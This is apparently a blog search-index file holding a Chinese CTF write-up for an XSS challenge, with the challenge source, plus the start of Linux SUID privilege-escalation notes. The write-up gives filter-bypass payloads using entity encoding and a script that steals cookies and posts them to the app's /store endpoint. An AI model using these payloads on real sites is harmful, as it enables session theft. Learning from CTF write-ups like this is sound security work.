<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Spreader_强网拟态24</title>
      <link href="/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/"/>
      <url>/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/</url>
      
        <content type="html"><![CDATA[<h2 id="分析与尝试-ALMOST-DONE"><a href="#分析与尝试-ALMOST-DONE" class="headerlink" title="分析与尝试(ALMOST DONE)"></a>分析与尝试(ALMOST DONE)</h2><ol><li><p>代码分析</p><ol><li>考点应该是xss，下来这么大功夫，不用猜，都明着写了triggerXSS</li><li>看一下代码，将用户存在users列表里，密码明文存储</li><li>访问&#x2F;时进行鉴权，只会显示对应权限的post，可知当role为ROLES.ADMIN时可以看到所有的内容</li><li>访问&#x2F;post时黑名单，可以直接写入content中，admin只可以看到previleged和admin的文章</li><li>任何人都可以获取&#x2F;store的内容，存的是req.body</li><li>显然要读&#x2F;flag内容</li></ol></li><li><p>不是哥们，如果我先做过这题网鼎直接秒了啊，真实艹了，现在轮到我秒你了，还是假装一下</p></li><li><p>目标，通过admin读到flag，然后写在post里或者&#x2F;store回来？也可以是直接带外如果开网的话，通过&#x2F;report_admin让admin来看</p><ol><li><em><strong>attacks(可以的，没有问题)</strong></em>: 普通用户写内容，&#x2F;report_previleged读让&#x2F;report_admin触发admin访问&#x2F;flag读取内容后访问&#x2F;store写入，然后使用本地用户登录并访问&#x2F;store即可</li><li>现在的问题在于<strong>绕过</strong>：检测大小写与全局，特殊函数<code>eval(</code>需要左括号才会被过滤，允许使用href和src但是不能加上恶意东西<ol><li>想到base64编码但是被过滤了，php伪协议+其他编码？source被过滤了</li><li>刚好<code>window[&#39;eval&#39;](atob(data))</code>可以行得通，可打，怎么调用到js –&gt; <em><strong>还是看题解了，不要浪费太多实践</strong></em></li></ol></li></ol> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 缺点：需要herf点击，这里行不通</span></span><br><span class="line"><span class="comment">// 返回javascript:后面就是可读内容</span></span><br><span class="line"><span class="comment">// javascript:在herf里才可以，img行不通</span></span><br><span class="line">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;<span class="variable language_">window</span>[<span class="string">&#x27;eval&#x27;</span>](<span class="title function_">atob</span>(data)) <span class="comment">// 在data中输入base64编码的值</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="bypass-and-payload"><a href="#bypass-and-payload" class="headerlink" title="***bypass and payload"></a>***bypass and payload</h2><ol><li><p>bypass: 这里使用了<em><strong>html自动闭合</strong></em>的特性调用js，使用<em><strong>实体编码</strong></em>来绕过关键词</p><ol><li>这里如果使用python发包的话，可以抓包看看是x-www-urlencoded或者是application&#x2F;json</li></ol> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- poc 成功调用alert() --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;<span class="symbol">&amp;#x64;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x3a;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x78;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x2f;</span><span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3b;</span><span class="symbol">&amp;#x62;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x34;</span><span class="symbol">&amp;#x2c;</span>YWxlcnQoKQ==&quot;</span>&gt;</span>&lt;/script</span><br></pre></td></tr></table></figure></li><li><p>paylaod</p><ol><li><p>打cookie写法，标签未闭合绕过</p>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 获取previlegedcookie</span></span><br><span class="line">&lt;script&gt;<span class="variable language_">window</span>[<span class="string">&#x27;alert&#x27;</span>](<span class="variable language_">document</span>.<span class="property">cookie</span>)&lt;/script</span><br><span class="line"><span class="comment">// 2. 不出网，上传后/report_privileged写入&#x27;/store&#x27;带出cookie</span></span><br><span class="line">&lt;script&gt;<span class="title function_">fetch</span>(<span class="string">&#x27;/store&#x27;</span>,&#123;<span class="attr">method</span>:<span class="string">&#x27;POST&#x27;</span>,<span class="attr">headers</span>:&#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;,<span class="attr">body</span>:<span class="built_in">encodeURIComponent</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)&#125;);&lt;/script</span><br><span class="line"><span class="comment">// 3. 登录previleged，同理上传后/report_privileged</span></span><br><span class="line"><span class="comment">// 4. 获取cookie访问/flag</span></span><br></pre></td></tr></table></figure></li><li><p>写入载体法略，总之js写一下在键值中再写一次就好</p></li></ol></li></ol><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> &#123; triggerXSS &#125; = <span class="built_in">require</span>(<span class="string">&#x27;../bot&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">Store</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isAuthenticated</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span>) &#123;</span><br><span class="line">        <span class="title function_">next</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="function">(<span class="params">users,posts,store,AdminPassWord,PrivilegedPassWord</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">ROLES</span> = &#123;</span><br><span class="line">        <span class="attr">PLAIN</span>: <span class="string">&quot;plain&quot;</span>,</span><br><span class="line">        <span class="attr">PRIVILEGED</span>: <span class="string">&quot;privileged&quot;</span>,</span><br><span class="line">        <span class="attr">ADMIN</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        res.<span class="title function_">sendFile</span>(<span class="string">&#x27;register.html&#x27;</span>, &#123; <span class="attr">root</span>: <span class="string">&#x27;./views&#x27;</span> &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    router.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; username, password, role &#125; = req.<span class="property">body</span>;</span><br><span class="line">        <span class="keyword">const</span> userExists = users.<span class="title function_">some</span>(<span class="function"><span class="params">u</span> =&gt;</span> u.<span class="property">username</span> === username);</span><br><span class="line">        <span class="keyword">if</span> (userExists) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;Username already exists!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        users.<span class="title function_">push</span>(&#123; username, password, <span class="attr">role</span>: <span class="string">&quot;plain&quot;</span> &#125;);</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        res.<span class="title function_">sendFile</span>(<span class="string">&#x27;login.html&#x27;</span>, &#123; <span class="attr">root</span>: <span class="string">&#x27;./views&#x27;</span> &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    router.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(username);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(password);</span><br><span class="line">        <span class="keyword">const</span> user = users.<span class="title function_">find</span>(<span class="function"><span class="params">u</span> =&gt;</span> u.<span class="property">username</span> === username &amp;&amp; u.<span class="property">password</span> === password);</span><br><span class="line">        <span class="keyword">if</span> (user) &#123;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">user</span> = user;</span><br><span class="line">            res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&#x27;Invalid credentials!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, isAuthenticated, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> currentUser = req.<span class="property">session</span>.<span class="property">user</span>;</span><br><span class="line">        <span class="keyword">let</span> filteredPosts = [];</span><br><span class="line">        <span class="keyword">if</span> (currentUser.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">ADMIN</span>) &#123;</span><br><span class="line">            filteredPosts = posts.<span class="title function_">filter</span>(<span class="function"><span class="params">p</span> =&gt;</span> p.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">PRIVILEGED</span> || p.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">ADMIN</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (currentUser.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">PRIVILEGED</span>) &#123;</span><br><span class="line">            filteredPosts = posts.<span class="title function_">filter</span>(<span class="function"><span class="params">p</span> =&gt;</span> p.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">PLAIN</span> || p.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">PRIVILEGED</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filteredPosts = posts.<span class="title function_">filter</span>(<span class="function"><span class="params">p</span> =&gt;</span> p.<span class="property">role</span> === <span class="variable constant_">ROLES</span>.<span class="property">PLAIN</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">`<span class="subst">$&#123;currentUser.role&#125;</span>`</span>, &#123; <span class="attr">posts</span>: filteredPosts, <span class="attr">user</span>: currentUser &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">post</span>(<span class="string">&#x27;/post&#x27;</span>, isAuthenticated, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> &#123; content &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> scriptTagRegex = <span class="regexp">/&lt;script\b[^&lt;]*(?:(?!&lt;\/script&gt;)&lt;[^&lt;]*)*&lt;\/script&gt;/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(scriptTagRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> eventHandlerRegex = <span class="regexp">/on\w+\s*=\s*([&quot;&#x27;]).*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(eventHandlerRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> javascriptURLRegex = <span class="regexp">/(?:href|src)\s*=\s*([&quot;&#x27;])\s*javascript:.*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(javascriptURLRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> dataURLRegex = <span class="regexp">/(?:href|src)\s*=\s*([&quot;&#x27;])\s*data:.*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(dataURLRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> cssExpressionRegex = <span class="regexp">/style\s*=\s*([&quot;&#x27;]).*?expression\([^&gt;]*?\).*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(cssExpressionRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> dangerousTagsRegex = <span class="regexp">/&lt;\/?(?:iframe|object|embed|link|meta|svg|base|source|form|input|video|audio|textarea|button|frame|frameset|applet)[^&gt;]*?&gt;/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(dangerousTagsRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> dangerousAttributesRegex = <span class="regexp">/\b(?:style|srcset|formaction|xlink:href|contenteditable|xmlns)\s*=\s*([&quot;&#x27;]).*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(dangerousAttributesRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> dangerousProtocolsRegex = <span class="regexp">/(?:href|src)\s*=\s*([&quot;&#x27;])(?:\s*javascript:|vbscript:|file:|data:|filesystem:).*?\1/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(dangerousProtocolsRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> dangerousFunctionsRegex = <span class="regexp">/\b(?:eval|alert|prompt|confirm|console\.log|Function)\s*\(/gi</span>;</span><br><span class="line">        content = content.<span class="title function_">replace</span>(dangerousFunctionsRegex, <span class="string">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        posts.<span class="title function_">push</span>(&#123; <span class="attr">content</span>: content, <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">username</span>, <span class="attr">role</span>: req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">role</span> &#125;);</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/logout&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="title function_">destroy</span>();</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/report_admin&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> <span class="title function_">triggerXSS</span>(<span class="string">&quot;admin&quot;</span>,<span class="title class_">AdminPassWord</span>);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`Admin Bot successfully logged in.`</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error Reporting:&#x27;</span>, error);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`Admin Bot successfully logged in.`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/report_privileged&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> <span class="title function_">triggerXSS</span>(<span class="string">&quot;privileged&quot;</span>,<span class="title class_">PrivilegedPassWord</span>);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`Privileged Bot successfully logged in.`</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error Reporting:&#x27;</span>, error);</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">`Privileged Bot successfully logged in.`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/store&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">json</span>(store);</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">post</span>(<span class="string">&#x27;/store&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">body</span>) &#123;</span><br><span class="line">            store.<span class="title function_">push</span>(req.<span class="property">body</span>);</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&#x27;Data stored successfully&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;No data received&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    router.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span> &amp;&amp; req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">role</span> === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">                fs.<span class="title function_">readFile</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error reading flag file:&#x27;</span>, err);</span><br><span class="line">                        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Internal Server Error&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    res.<span class="title function_">send</span>(<span class="string">`Your Flag Here: <span class="subst">$&#123;data&#125;</span>`</span>);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Unauthorized!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error fetching flag:&#x27;</span>, error);</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Internal Server Error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> router;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux提权</title>
      <link href="/2024/11/04/Linux%E6%8F%90%E6%9D%83/"/>
      <url>/2024/11/04/Linux%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h2 id="Ref"><a href="#Ref" class="headerlink" title="*Ref"></a>*Ref</h2><ol><li>特权教程<ol><li><a href="https://blog.csdn.net/weixin_39190897/article/details/135429139">多种提权姿势都有讲到</a></li><li><a href="https://blog.csdn.net/st3pby/article/details/127718846">很好的文章！数据库等提权</a></li></ol></li><li>linux命令手册<ol><li><a href="https://linux.die.net/">官方</a></li><li><a href="https://www.linuxcool.com/">民间教程</a></li></ol></li><li>T00ls<ol><li><strong>终极大杀器</strong><a href="https://gtfobins.github.io/">GTFOBins</a><ol><li>GTFOBins是一个精心策划的Unix二进制文件列表，可以用来绕过错误配置系统中的本地安全限制<ol><li>该项目收集了Unix二进制文件的合法函数，这些函数可能被滥用，以打破受限制的shell，升级或维护提升的特权，传输文件，生成绑定和反向shell，并为其他事后利用任务提供便利</li></ol></li><li><strong>only 参照表:</strong> 需要注意的是，这不是一个漏洞列表，这里列出的程序本身并不容易受到攻击，相反，GTFOBins是一个概要，说明当您只有某些二进制文件可用时，如何获得root权限。</li></ol></li></ol></li></ol><h2 id="Linux权限基本概念"><a href="#Linux权限基本概念" class="headerlink" title="Linux权限基本概念"></a>Linux权限基本概念</h2><h3 id="用户与用户组"><a href="#用户与用户组" class="headerlink" title="用户与用户组"></a>用户与用户组</h3><ol><li>Linux 是一个多用户操作系统，每个用户都有自己的用户名和密码，并且可以属于一个或多个用户组</li><li><em><strong>进程权限:</strong></em> 每个进程都会以某个特定的用户身份运行，该进程的权限受该用户权限的限制</li><li><em><strong>文件权限:</strong></em> 在 Linux 中，文件和目录都有所有权和权限设置。这些权限决定了哪些用户可以读取、写入或执行文件。当一个进程试图访问文件时，它只能根据其运行的用户身份所具有的权限来进行操作</li></ol><h3 id="进程权限继承"><a href="#进程权限继承" class="headerlink" title="进程权限继承"></a>进程权限继承</h3><ol><li>linux中子进程从父进程那里继承一定的权限和属性</li><li>用户和组 ID 继承 –&gt; 对文件读写权限的继承<ol><li>Real User ID, RUID：表示启动进程的实际用户</li><li>Effective User ID, EUID：用于确定进程的权限。</li><li>Saved Set User ID, SUID：用于在切换用户 ID 时存储原来的 EUID</li><li>Real Group ID, RGID：表示启动进程的实际用户组</li><li>Effective Group ID, EGID：用于确定进程的组权限</li><li>Supplementary Group IDs：表示进程所属的其他组</li></ol></li><li>文件描述符继承<ol><li>子进程会继承父进程打开的文件描述符。这意味着如果父进程打开了某个文件或网络连接，子进程也可以访问这些资源</li></ol></li><li>环境变量继承</li><li>资源限制继承</li><li><em><strong>特殊权限位</strong></em><ol><li>Set-User-ID (SUID)：如果可执行文件设置了 SUID 位，那么运行该文件的进程的有效用户 ID (EUID) 将是文件所有者的用户 ID，而不是运行该文件的用户的 ID</li><li>Set-Group-ID (SGID)：如果可执行文件设置了 SGID 位，那么运行该文件的进程的有效组 ID (EGID) 将是文件所有者的组 ID，而不是运行该文件的用户的组 ID</li></ol></li></ol><h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><h3 id="suid-ref"><a href="#suid-ref" class="headerlink" title="*suid ref"></a>*suid ref</h3><ol><li><a href="https://gtfobins.github.io/#+suid">github quick find payload</a></li><li><a href="https://blog.csdn.net/CoreNote/article/details/122093180">suid解释得挺好的</a></li><li><a href="https://blog.csdn.net/weixin_39190897/article/details/135429139">对应的suid章节附加命令很全面</a></li><li><a href="https://xz.aliyun.com/t/12535?time__1311=GqGxuCitqWq052x+xCq47wgRDnmDRi2=oD">附加一些额外的东西和命令，适合助眠</a></li><li><a href="https://cloud.tencent.com/developer/article/1878212">这篇也有一些命令</a></li><li><a href="https://www.cnblogs.com/yuy0ung/articles/18421470">suid更加深层的利用方法</a></li></ol><h3 id="什么是suid"><a href="#什么是suid" class="headerlink" title="什么是suid?"></a>什么是suid?</h3><ol><li><p>除了rwx，在linux还有三种特殊权限</p><ol><li>SUID(set user id)<ol><li>仅对二进制程序有效（binary program）</li><li>执行者对于该程序需要具有x的可执行权限</li><li>本权限仅在执行该程序的过程中有效（run-time）</li><li><strong>执行者将具有该程序拥有者的权限</strong></li></ol></li><li>SGID(set group id)<ol><li>SGID对二进制文件有用；</li><li>程序执行者对该程序来说，具有x权限；</li><li><strong>执行者在执行的过程中将获得该程序群组的权限</strong></li><li>用于二进制可执行文件上以及目录上，此目录新建的文件的所属组将自动从此目录继承</li></ol></li><li>Sticky Bit<ol><li>SBIT只针对目录有效</li><li>除非目录的属主和root用户有权限删除它，除此之外其它用户不能删除和修改这个目录 -&gt; 表示此目录的文件只能由所有者自己来删除</li><li>当 SGID 